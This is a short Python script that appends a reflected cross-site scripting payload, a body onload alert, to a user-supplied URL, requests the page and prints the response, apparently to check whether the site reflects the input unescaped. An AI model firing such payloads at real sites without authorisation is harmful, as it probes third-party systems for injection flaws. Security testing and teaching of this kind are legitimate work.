import requests

url = input("URL: ")
payload = "<body onload=alert('XSS')>"

response = requests.get(url + payload)
print(response.text)
